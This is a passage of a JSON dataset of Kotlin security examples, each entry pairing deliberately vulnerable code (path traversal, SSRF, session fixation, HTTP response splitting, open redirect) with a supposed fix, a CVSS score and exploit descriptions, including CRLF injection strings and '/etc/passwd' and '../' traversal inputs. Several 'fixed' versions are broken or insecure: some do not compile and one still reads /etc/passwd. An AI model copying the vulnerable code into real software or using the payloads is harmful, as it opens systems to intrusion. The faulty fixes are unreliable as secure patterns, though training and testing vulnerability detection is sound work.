            "By using iframes, an attacker can attempt to load the WebView in another context to steal clicks intended for other elements.",
            "Crafting specific URLs that the WebView might interpret differently than expected can lead to unauthorized actions within the WebView."
        ]
    },
    "kotlin_28": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "fun readFile(fileName: String): String? {\\n    val file = java.io.File(\"/safe/directory/$fileName\")\\n    return if (file.exists() && !file.isDirectory) file.readText() else null\\n}",
        "cvss_score": 4.2,
        "fixed_code": "fun readFile(fileName: String): String? {\\n    val safeDirectory = \"/safe/directory/\"\\n    val canonicalPath = java.io.File(safeDirectory + fileName).canonicalPath\\n    return if (canonicalPath.startsWith(safeDirectory) && !java.io.File(canonicalPath).isDirectory) java.io.File(canonicalPath).readText() else null\\n}",
        "exploit_ways": [
            "An attacker can use '../' to navigate up the directory tree and access files outside of /safe/directory.",
            "By using symbolic links within /safe/directory, an attacker might redirect the file path to a sensitive location.",
            "Exploiting relative paths with '..%2F..' could bypass naive checks if not properly sanitized."
        ]
    },
    "kotlin_29": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "package com.example\nimport javax.servlet.http.HttpServlet\nimport javax.servlet.http.HttpServletRequest\nimport javax.servlet.http.HttpServletResponse\nclass VulnerableServlet : HttpServlet() {\n    override fun doGet(request: HttpServletRequest, response: HttpServletResponse) {\n        val userParam = request.getParameter(\"userInput\")\n        response.setHeader(\"Set-Cookie\", \"data=$userParam; path=/\")\n        response.writer.println(\"User input received: $userParam\")\n    }\n}",
        "cvss_score": 5.3,
        "fixed_code": "package com.example\nimport javax.servlet.http.HttpServlet\nimport javax.servlet.http.HttpServletRequest\nimport javax.servlet.http.HttpServletResponse\nclass SecureServlet : HttpServlet() {\n    override fun doGet(request: HttpServletRequest, response: HttpServletResponse) {\n        val userParam = request.getParameter(\"userInput\")?.replace(\"\r\", \"\").replace(\"\n\", \"\")\n        response.setHeader(\"Set-Cookie\", \"data=$userParam; path=/\")\n        response.writer.println(\"User input received: $userParam\")\n    }\n}",
        "exploit_ways": [
            "An attacker can inject '\\r\\nSet-Cookie: admin=true' to manipulate cookies.",
            "Could use '\\r\\nContent-Length: 0\\r\\n\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\nContent-Length: 36\\r\\n\\r\\n<html><body>Malicious Content</body></html>' to inject additional responses.",
            "Injecting '\\r\\nX-XSS-Protection: 0' can disable XSS protection on the client."
        ]
    },
    "kotlin_31": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "package com.example.sessionfixation\\nimport javax.servlet.http.Cookie\\nimport javax.servlet.http.HttpServlet\\nimport javax.servlet.http.HttpServletRequest\\nimport javax.servlet.http.HttpServletResponse\\nclass LoginServlet : HttpServlet() {\\n    override fun doGet(req: HttpServletRequest, resp: HttpServletResponse) {\\n        val sessionId = req.getParameter(\"session_id\")\\n        if (sessionId != null) {\\n            val cookie = Cookie(\"SESSIONID\", sessionId)\\n            resp.addCookie(cookie)\\n        }\\n        resp.sendRedirect(\"/home\")\\n    }\\n}",
        "cvss_score": 4.2,
        "fixed_code": "package com.example.sessionfixation\\nimport javax.servlet.http.Cookie\\nimport javax.servlet.http.HttpServlet\\nimport javax.servlet.http.HttpServletRequest\\nimport javax.servlet.http.HttpServletResponse\\nclass LoginServlet : HttpServlet() {\\n    override fun doGet(req: HttpServletRequest, resp: HttpServletResponse) {\\n        val session = req.getSession(true)\\n        val cookie = Cookie(\"SESSIONID\", session.id)\\n        resp.addCookie(cookie)\\n        resp.sendRedirect(\"/home\")\\n    }\\n}",
        "exploit_ways": [
            "An attacker can set a specific session_id in the URL to hijack a valid user's session.",
            "By sharing the malicious link, the attacker can trick users into using a fixed session ID controlled by them.",
            "The vulnerability can be used in phishing attacks to create authenticated sessions for attackers."
        ]
    },
    "kotlin_32": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "import java.net.URL\nimport java.io.BufferedReader\nimport java.io.InputStreamReader\nfun fetchData(urlString: String): String {\n    val url = URL(urlString)\n    val reader = BufferedReader(InputStreamReader(url.openStream()))\n    var inputLine: String?\n    val response = StringBuilder()\n    while (reader.readLine().also { inputLine = it } != null) {\n        response.append(inputLine)\n    }\n    reader.close()\n    return response.toString()\n}",
        "cvss_score": 7.5,
        "fixed_code": "import java.net.URL\nimport java.io.BufferedReader\nimport java.io.InputStreamReader\nfun fetchData(urlString: String): String {\n    val allowedHosts = listOf(\"api.example.com\", \"secure.example.com\")\n    val url = URL(urlString)\n    if (!allowedHosts.contains(url.host)) {\n        throw IllegalArgumentException(\"Unauthorized host\")\n    }\n    val reader = BufferedReader(InputStreamReader(url.openStream()))\n    var inputLine: String?\n    val response = StringBuilder()\n    while (reader.readLine().also { inputLine = it } != null) {\n        response.append(inputLine)\n    }\n    reader.close()\n    return response.toString()\n}",
        "exploit_ways": [
            "An attacker could request an internal resource by passing a URL like 'http://localhost:8080/secrets'.",
            "Using SSRF, attackers might access sensitive services on the same network segment, such as database servers or web management interfaces.",
            "By requesting URLs with crafted payloads, an attacker can attempt to cause Denial of Service (DoS) conditions by overloading internal resources."
        ]
    },
    "kotlin_33": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "import java.io.IOException\\nimport kotlin.system.exitProcess\\n\\nclass DosServer {\\n    @Throws(IOException::class)\\n    fun start() {\\n        while (true) {\\n            try {\\n                Thread.sleep(1000)\\n                println(\"Server is running...\")\\n            } catch (e: InterruptedException) {\\n                println(\"Thread interrupted: ${e.message}\")\\n            }\\n        }\\n    }\\n\\n    companion object {\\n        @JvmStatic\\n        fun main(args: Array<String>) {\\n            val server = DosServer()\\n            server.start()\\n        }\\n    }\\n}",
        "cvss_score": 3.5,
        "fixed_code": "import java.io.IOException\nimport kotlin.system.exitProcess\n\nclass DosServer {\n    @Throws(IOException::class)\n    fun start() {\n        while (true) {\n            try {\n                Thread.sleep(1000)\n                println(\"Server is running...\")\n            } catch (e: InterruptedException) {\n                println(\"Thread interrupted: ${e.message}\")\n                exitProcess(1)\n            }\n        }\n    }\n\n    companion object {\n        @JvmStatic\n        fun main(args: Array<String>) {\n            val server = DosServer()\n            server.start()\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker could exploit the infinite loop by interrupting the thread, causing the server to continuously restart.",
            "By sending a SIGINT signal repeatedly, the server might become unresponsive if not handled properly.",
            "The server's constant resource usage (CPU and memory) can lead to system exhaustion, affecting other applications."
        ]
    },
    "kotlin_34": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "fun openRedirect(url: String) {\n    val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))\n    startActivity(intent)\n}",
        "cvss_score": 6.5,
        "fixed_code": "fun safeOpenRedirect(baseUrl: String, url: String) {\n    if (url.startsWith(baseUrl)) {\n        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))\n        startActivity(intent)\n    } else {\n        throw IllegalArgumentException(\"Invalid URL\")\n    }\n}",
        "exploit_ways": [
            "An attacker can redirect users to a malicious site by providing a crafted URL.",
            "The vulnerability can be used to launch phishing attacks by directing users to fake login pages.",
            "Users can be redirected to download malware or execute harmful scripts if the URL points to a compromised server."
        ]
    },
    "kotlin_35": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "import java.io.File\nimport java.io.FileReader\nfun readSensitiveFile(): String {\n    val file = File(\"/etc/passwd\")\n    val reader = FileReader(file)\n    return reader.readText()\n}",
        "cvss_score": 3.5,
        "fixed_code": "import java.nio.file.Files\nimport java.nio.file.Paths\nfun readSensitiveFile(): String {\n    try {\n        return String(Files.readAllBytes(Paths.get(\"/etc/passwd\")))\n    } catch (e: Exception) {\n        e.printStackTrace()\n        return \"\"\n    }\n}",
        "exploit_ways": [
            "An attacker could gain access to system user information by exploiting this vulnerability.",
            "They might use the disclosed information for social engineering attacks or further privilege escalation.",
            "The file contents could be used to identify potential attack vectors on the system."
        ]
    },
    "kotlin_36": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "import kotlinx.coroutines.*\n\nobject SharedResource {\n    var value = 0\n}\n\nfun main() = runBlocking {\n    val jobs = List(100) { launch {\n        repeat(1000) {\n            SharedResource.value++\n        }\n    }}\n    jobs.forEach { it.join() }\n    println(\"Final value: ${SharedResource.value}\")\n}",
        "cvss_score": 3.5,
        "fixed_code": "import kotlinx.coroutines.*\n\nobject SharedResource {\n    private val mutex = Mutex()\n    var value = 0\n        get() = field\n        set(value) { field = value }\n}\n\nsuspend fun incrementValue() {\n    SharedResource.mutex.withLock {\n        SharedResource.value++\n    }\n}\n\nfun main() = runBlocking {\n    val jobs = List(100) { launch {\n        repeat(1000) {\n            incrementValue()\n        }\n    }}\n    jobs.forEach { it.join() }\n    println(\"Final value: ${SharedResource.value}\")\n}",
        "exploit_ways": [
            "An attacker could potentially manipulate the execution order of coroutines to achieve incorrect increments.",
            "By controlling coroutine scheduling, an attacker might cause the final value to be less than expected due to race conditions.",
            "If this code is part of a larger system, an attacker could exploit the race condition to alter the state in unpredictable ways."
        ]
    },
    "kotlin_37": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "fun redirectTo(url: String) {\n    val encodedUrl = URLEncoder.encode(url, \"UTF-8\").replace(\"%3A\\\", \":\").replace(\"%2F\\\", /\")\n    val intent = Intent(Intent.ACTION_VIEW, Uri.parse(encodedUrl))\n    startActivity(intent)\n}",
        "cvss_score": 7.5,
        "fixed_code": "fun redirectTo(url: String) {\n    val allowedHosts = listOf(\"example.com\", \"anotherallowed.com\")\n    val uri = Uri.parse(url)\n    if (uri.host in allowedHosts) {\n        val intent = Intent(Intent.ACTION_VIEW, uri)\n        startActivity(intent)\n    } else {\n        throw IllegalArgumentException(\"Invalid URL host\")\n    }\n}",
        "exploit_ways": [
            "An attacker could redirect users to a malicious site by providing a crafted URL.",
            "They can use the vulnerability to phish for user credentials by redirecting them to a fake login page.",
            "Crafted URLs could be used to install malware on the device by redirecting to an untrusted download source."
        ]
    },
    "kotlin_38": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "fun sensitiveDataLeak(): String {\\n    val secret = \\\"This is a secret message.\\\"\\n    return if (System.getenv(\\\"DEBUG\\\") == \\\"true\\\") secret else \\\"No data to show.\\\"\\n}",
        "cvss_score": 3.0,
        "fixed_code": "fun sensitiveDataLeak(): String {\\n    val secret = \\\"This is a secret message.\\\"\\n    return if (System.getenv(\\\"DEBUG\\\") == \\\"true\\\") && BuildConfig.DEBUG) secret else \\\"No data to show.\\\"\\n}",
        "exploit_ways": [
            "An attacker setting the DEBUG environment variable to 'true' can access sensitive information.",
            "If running in a development environment, the DEBUG flag might be set inadvertently leading to information disclosure.",
            "In cloud deployments with misconfigured environment variables, attackers could exploit this vulnerability."
        ]
    },
    "kotlin_39": {
        "vulnerability_type": "Session Fixation",
        "vulnerability_code": "fun setSessionCookie(userId: String, response: HttpServletResponse) {\n    val cookie = Cookie(\"SESSIONID\", userId)\n    cookie.path = \"/\"\n    cookie.isHttpOnly = true\n    response.addCookie(cookie)\n}",
        "cvss_score": 4.2,
        "fixed_code": "fun setSessionCookie(userId: String, response: HttpServletResponse) {\n    val sessionId = java.util.UUID.randomUUID().toString()\n    val cookie = Cookie(\"SESSIONID\", sessionId)\n    cookie.path = \"/\"\n    cookie.isHttpOnly = true\n    response.addCookie(cookie)\n}",
        "exploit_ways": [
            "An attacker can predict or guess the session ID if it is based on a predictable pattern.",
            "If a valid session ID is leaked, an attacker can hijack the user's session by setting the same SESSIONID cookie in their browser.",
            "By manipulating URLs with pre-set session IDs, attackers could force users to authenticate under compromised sessions."
        ]
    },
    "kotlin_40": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "import javax.servlet.http.HttpServletRequest\nimport javax.servlet.http.HttpServletResponse\nfun setSessionId(request: HttpServletRequest, response: HttpServletResponse) {\n    val sessionId = request.getParameter(\"session_id\")\n    if (sessionId != null) {\n        request.changeSessionId()\n        val session = request.getSession(true)\n        session.id = sessionId\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "import javax.servlet.http.HttpServletRequest\nimport javax.servlet.http.HttpServletResponse\nfun setSessionId(request: HttpServletRequest, response: HttpServletResponse) {\n    request.changeSessionId()\n}",
        "exploit_ways": [
            "An attacker can provide a session ID to associate their own session with the target user's account.",
            "By setting a specific session ID, an attacker can maintain control over the session after the user logs in.",
            "This allows the attacker to perform actions as if they were logged in as the target user without authentication."
        ]
    },
    "kotlin_41": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "import android.view.View\nfun setupOverlay(view: View) {\n    val overlay = View(context)\n    overlay.visibility = View.VISIBLE\n    view.parent.addView(overlay)\n}",
        "cvss_score": 4.0,
        "fixed_code": "import android.view.View\nimport android.widget.FrameLayout\nimport android.view.ViewGroup.LayoutParams\nfun setupOverlay(view: View) {\n    val overlay = View(context)\n    overlay.visibility = View.VISIBLE\n    val params = FrameLayout.LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT)\n    params.setMargins(0, 0, 0, 0)\n    view.parent.addView(overlay, params)\n    overlay.setOnClickListener { v ->\n        // Handle click event to prevent unintended actions\n    }\n}",
        "exploit_ways": [
            "An attacker could overlay a transparent malicious button on top of the intended UI element.",
            "By positioning the overlay strategically, they can trick users into clicking it without realizing.",
            "The overlay can be made to mimic another application's interface, causing users to perform actions unintentionally."
        ]
    },
    "kotlin_42": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "package com.example\n\nimport javax.servlet.http.Cookie\nimport javax.servlet.http.HttpServletRequest\nimport javax.servlet.http.HttpServletResponse\nimport javax.servlet.annotation.WebServlet\nimport javax.servlet.http.HttpServlet\n\n@WebServlet(\"/login\")\nclass LoginServlet : HttpServlet() {\n    override fun doGet(request: HttpServletRequest, response: HttpServletResponse) {\n        val session = request.getSession(true)\n        val sessionIdCookie = Cookie(\"JSESSIONID\", session.id)\n        response.addCookie(sessionIdCookie)\n        response.sendRedirect(\"/dashboard\")\n    }\n}",
        "cvss_score": 3.1,
        "fixed_code": "package com.example\n\nimport javax.servlet.http.Cookie\nimport javax.servlet.http.HttpServletRequest\nimport javax.servlet.http.HttpServletResponse\nimport javax.servlet.annotation.WebServlet\nimport javax.servlet.http.HttpServlet\n\n@WebServlet(\"/login\")\nclass LoginServlet : HttpServlet() {\n    override fun doGet(request: HttpServletRequest, response: HttpServletResponse) {\n        request.changeSessionId()\n        val session = request.getSession(true)\n        val sessionIdCookie = Cookie(\"JSESSIONID\", session.id)\n        response.addCookie(sessionIdCookie)\n        response.sendRedirect(\"/dashboard\")\n    }\n}",
        "exploit_ways": [
            "An attacker can set a fixed JSESSIONID cookie in the victim's browser before they log in, then hijack the session.",
            "Attacker could use this to perform actions on behalf of the logged-in user without their knowledge.",
            "By fixing the session ID, attackers can maintain control over sessions across multiple login attempts."
        ]
    },
    "kotlin_43": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "fun readFile(fileName: String): String? {\\n    val file = java.io.File(fileName)\\n    return file.readText()\\n}",
        "cvss_score": 5.3,
        "fixed_code": "fun readFile(fileName: String, allowedPaths: List<String>): String? {\\n    if (allowedPaths.contains(fileName)) {\\n        val file = java.io.File(fileName)\\n        return file.readText()\\n    }\\n    throw IllegalArgumentException(\"File not allowed\")\\n}",
        "exploit_ways": [
            "An attacker can input '/etc/passwd' to read system user information.",
            "They could use '../flag.txt' to access files outside the intended directory if any flag file exists nearby.",
            "Input like 'C:\\\\Windows\\\\system.ini' on a Windows server to retrieve sensitive system configuration."
        ]
    },
    "kotlin_44": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "fun unsafeFunction() {\n    val file = java.io.File(\"example.txt\")\n    if (!file.exists()) {\n        file.createNewFile()\n    }\n    val writer = file.writer()\n    writer.write(\"Sensitive data\\n\")\n    writer.close()\n}",
        "cvss_score": 5.3,
        "fixed_code": "fun safeFunction() {\n    val file = java.io.File(\"example.txt\")\n    file.createNewFile()\n    synchronized(file) {\n        val writer = file.writer(Append)\n        writer.write(\"Sensitive data\\n\")\n        writer.close()\n    }\n}",
        "exploit_ways": [
            "An attacker could create a symlink to a critical system file before the file check, causing sensitive data to be written there.",
            "By repeatedly running the program and deleting the file at the right moment, an attacker might prevent the file from being created properly, leading to potential data loss or corruption.",
            "If multiple instances of the application are run simultaneously, they could interfere with each other's file operations, potentially leading to incomplete writes or corrupted data."
        ]
    },
    "kotlin_45": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "fun handleRequest(response: HttpServletResponse) {\n    response.writer.write(\"Hello, World!\")\n}",
        "cvss_score": 3.5,
        "fixed_code": "fun handleRequest(response: HttpServletResponse) {\n    response.setHeader(\"Content-Security-Policy\", \"default-src 'self'\")\n    response.setHeader(\"X-Frame-Options\", \"SAMEORIGIN\")\n    response.setHeader(\"X-XSS-Protection\", \"1; mode=block\")\n    response.setHeader(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\")\n    response.writer.write(\"Hello, World!\")\n}",
        "exploit_ways": [
            "Attacker can perform cross-site scripting (XSS) attacks due to the lack of Content Security Policy.",
            "Clickjacking attacks are possible as X-Frame-Options is not set.",
            "Cross-site request forgery (CSRF) may be more effective without appropriate security headers."
        ]
    },
    "kotlin_46": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "fun unsafeFunction() {\n    val sharedResource = StringBuilder()\n    Thread {\n        for (i in 0 until 1000) {\n            sharedResource.append(\"A\")\n        }\n    }.start()\n    Thread {\n        for (i in 0 until 1000) {\n            sharedResource.append(\"B\")\n        }\n    }.start()\n}",
        "cvss_score": 4.2,
        "fixed_code": "fun safeFunction() {\n    val sharedResource = StringBuilder()\n    val lock = Any()\n    Thread {\n        synchronized(lock) {\n            for (i in 0 until 1000) {\n                sharedResource.append(\"A\")\n            }\n        }\n    }.start()\n    Thread {\n        synchronized(lock) {\n            for (i in 0 until 1000) {\n                sharedResource.append(\"B\")\n            }\n        }\n    }.start()\n}",
        "exploit_ways": [
            "An attacker could cause the StringBuilder to produce inconsistent results by manipulating thread scheduling, leading to data corruption.",
            "If this function is part of a larger system where the output of sharedResource is critical, incorrect data could lead to unintended behavior or security vulnerabilities elsewhere in the application.",
            "In a multi-threaded environment, an attacker might exploit the race condition to inject malicious data into sharedResource, affecting other parts of the application that rely on this resource."
        ]
    },
    "kotlin_47": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "import org.springframework.boot.SpringApplication\\nimport org.springframework.boot.autoconfigure.SpringBootApplication\\nimport org.springframework.web.bind.annotation.GetMapping\\nimport org.springframework.web.bind.annotation.RestController\\n\\n@SpringBootApplication\\nclass VulnerableApp {\\n\\n    @RestController\\n    class HelloController {\\n        @GetMapping(\\\"/hello\\\")\\n        fun sayHello(): String {\\n            return \\\"Hello, World!\\\"\\n        }\\n    }\\n}\\n\\nfun main(args: Array<String>) {\\n    SpringApplication.run(VulnerableApp::class.java, *args)\\n}",
        "cvss_score": 4.3,
        "fixed_code": "import org.springframework.boot.SpringApplication\\nimport org.springframework.boot.autoconfigure.SpringBootApplication\\nimport org.springframework.web.bind.annotation.GetMapping\\nimport org.springframework.web.bind.annotation.RestController\\nimport org.springframework.context.annotation.Bean\\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity\\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity\\nimport org.springframework.security.web.SecurityFilterChain\\n\\n@SpringBootApplication\\nclass SecureApp {\\n\\n    @RestController\\n    class HelloController {\\n        @GetMapping(\\\"/hello\\\")\\n        fun sayHello(): String {\\n            return \\\"Hello, World!\\\"\\n        }\\n    }\\n\\n    @EnableWebSecurity\\n    class SecurityConfig {\\n        @Bean\\n        fun securityFilterChain(http: HttpSecurity): SecurityFilterChain {\\n            http.headers().frameOptions().sameOrigin()\\n                .and().contentSecurityPolicy(\"default-src 'self'\")\\n                .and().xssProtection().block(true)\\n                .and().contentTypeOptions().and().httpStrictTransportSecurity().maxAgeInSeconds(31536000)\\n            return http.build()\\n        }\\n    }\\n}\\n\\nfun main(args: Array<String>) {\\n    SpringApplication.run(SecureApp::class.java, *args)\\n}",
        "exploit_ways": [
            "An attacker could inject malicious scripts into the application to steal user data.",
            "Cross-Site Scripting (XSS) attacks can manipulate content and perform actions on behalf of users.",
            "Clickjacking attacks can trick users into clicking buttons or links in a disguised iframe."
        ]
    },
    "kotlin_48": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "import spark.Spark\nfun main() {\n    Spark.get(\"/\") { req, res -> \"Hello, World!\" }\n}",
        "cvss_score": 3.4,
        "fixed_code": "import spark.Spark\nfun main() {\n    Spark.init()\n    Spark.after { req, res ->\n        res.header(\"Content-Security-Policy\", \"default-src 'self'\")\n        res.header(\"X-Content-Type-Options\", \"nosniff\")\n        res.header(\"X-Frame-Options\", \"SAMEORIGIN\")\n        res.header(\"X-XSS-Protection\", \"1; mode=block\")\n    }\n    Spark.get(\"/\") { req, res -> \"Hello, World!\" }\n}",
        "exploit_ways": [
            "An attacker could inject malicious scripts into the response to perform XSS attacks.",
            "Lack of Content-Security-Policy allows loading resources from insecure origins, risking data theft.",
            "Without X-Frame-Options, an attacker could embed the site in a frame and trick users."
        ]
    },
    "kotlin_49": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "fun sensitiveData(): String {\\n    val secret = \"ThisIsASecretKey\"\\n    return if (System.getenv(\"DEBUG_MODE\") == \"true\") secret else \"Default Value\"\\n}",
        "cvss_score": 3.5,
        "fixed_code": "fun sensitiveData(): String {\\n    val secret = \"ThisIsASecretKey\"\\n    return \"Default Value\"\\n}",
        "exploit_ways": [
            "An attacker can set the DEBUG_MODE environment variable to 'true' to retrieve sensitive data.",
            "If running in a shared or insecure environment, other users could exploit this to access secret keys.",
            "In certain deployment scenarios, logs might include function outputs, inadvertently leaking secrets."
        ]
    }
}